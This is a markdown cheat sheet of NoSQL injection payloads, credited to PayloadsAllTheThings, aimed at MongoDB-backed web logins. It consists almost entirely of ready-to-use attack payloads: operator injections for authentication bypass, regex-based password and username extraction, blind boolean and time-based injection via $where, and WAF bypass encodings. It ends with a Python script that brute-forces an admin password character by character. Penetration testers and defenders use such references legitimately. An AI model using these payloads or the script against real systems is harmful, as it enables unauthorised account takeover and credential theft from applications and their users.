# NoSQL Injection Payloads

> Source: PayloadsAllTheThings — NoSQL Injection

## MongoDB Operator Injection

### URL-Encoded (GET/POST Parameters)

```
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$exists]=true&password[$exists]=true
login[$regex]=.*&pass[$ne]=x
login[$regex]=^admin&pass[$ne]=x
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
username[$nin][0]=x&password[$nin][0]=x
```

### JSON Body (POST)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
```

## Authentication Bypass

```json
// Bypass login — match any user/password
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Target specific user
{"username": "admin", "password": {"$gt": ""}}

// Bypass with $regex
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

```
# URL-encoded equivalent
username=admin&password[$ne]=x
username[$ne]=invalid&password[$ne]=invalid
```

## Data Extraction via $regex

### Password Length Detection

```json
{"username": "admin", "password": {"$regex": ".{1}"}}
{"username": "admin", "password": {"$regex": ".{5}"}}
{"username": "admin", "password": {"$regex": ".{10}"}}
```

Increment length until response changes.

### Character-by-Character Extraction

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

### Username Enumeration

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

## Blind NoSQL Injection

### Boolean-Based

```json
// True condition
{"username": "admin", "password": {"$ne": ""}}

// False condition
{"username": "admin", "password": {"$eq": "definitelywrong"}}

// Extract data character by character
{"username": "admin", "password": {"$regex": "^p"}}    // true/false
{"username": "admin", "password": {"$regex": "^pa"}}   // true/false
{"username": "admin", "password": {"$regex": "^pas"}}  // true/false
```

### Time-Based (via $where)

```json
{"username": "admin", "$where": "sleep(5000)"}
{"$where": "this.username == 'admin' && sleep(5000)"}
```

## Server-Side JavaScript Injection ($where)

```json
{"$where": "return true"}
{"$where": "1==1"}
{"$where": "this.password.match(/.*/)"}

// RCE via $where (older MongoDB < 2.4)
{"$where": "function(){return this.username == tojsononeline(this)}"}

// Data exfiltration
{"username": {"$gt": ""}, "$where": "this.username == 'admin'"}
```

## Other Operators

### $exists — Field Enumeration

```json
{"field_name": {"$exists": true}}
{"secret_field": {"$exists": true}, "password": {"$ne": ""}}
```

### $type — Type Confusion

```json
{"password": {"$type": 2}}
```

Type 2 = string, can bypass type checks.

### $or / $and

```json
{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
{"$and": [{"username": {"$regex": "^a"}}, {"password": {"$ne": ""}}]}
```

## WAF Bypass Techniques

### Duplicate Keys (Last Key Wins)

```json
{"id": "safe_value", "id": {"$ne": ""}}
```

### Unicode Encoded Operators

```json
{"username": {"\u0024\u006e\u0065": ""}}
```

### Array Injection

```
username=admin&password[$ne]=&password[$ne]=x
```

## Automation Script

```python
import requests
import string

url = "http://target/login"
password = ""
chars = string.ascii_lowercase + string.digits

while True:
    found = False
    for c in chars:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```
